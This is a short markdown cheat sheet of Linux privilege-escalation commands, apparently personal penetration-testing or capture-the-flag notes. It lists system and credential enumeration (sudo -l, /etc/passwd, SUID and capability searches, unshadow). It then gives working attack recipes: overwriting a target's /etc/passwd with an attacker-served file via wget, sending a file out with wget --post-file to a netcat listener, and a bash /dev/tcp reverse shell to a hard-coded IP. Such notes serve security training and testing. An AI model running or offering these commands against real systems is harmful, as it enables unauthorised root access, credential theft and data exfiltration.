# Linux Privesc

```
hostname

uname -a

/proc/version

/etc/issue

ps axjf

ps aux

env

sudo -l

id

/etc/passwd

history

ifconfig

ip route

netstat -ano

netstat -tulpn



```



unshadow passwd.txt shadow.txt > passwords.txt





```  
find / -type f -perm -04000 -ls 2>/dev/null


find / -perm /4000 -type f -exec ls -lda {} \; 2>/dev/null
```

```
getcap -r / 2>/dev/null

```

```
/etc/crontab

cat /etc/crontab
```

https://gtfobins.github.io/
https://lolbas-project.github.io/
https://www.exploit-db.com/

https://github.com/SolomonSklash/htbenum


## WGET 1 

### Attacker

```
openssl passwd -1 -salt salt pass123
```

localy add to the an example passwd file and make it available on http

```
python3 -m http.server
```

### Target
```
wget -O passwd http://192.168.1.108:8000/passwd
```

login or su to that user with the password 'pass123'

## WGET 2

### Attacker

open netcat to allow the target to push the file

```
nc -lvnp 1234
```

### Target

```
URL=attacker_ip:1234
LFILE=file_to_send
wget --post-file=$LFILE $URL
```

# Reverse Shell
```
bash -i >& /dev/tcp/10.9.65.211/1234 0>&1
```
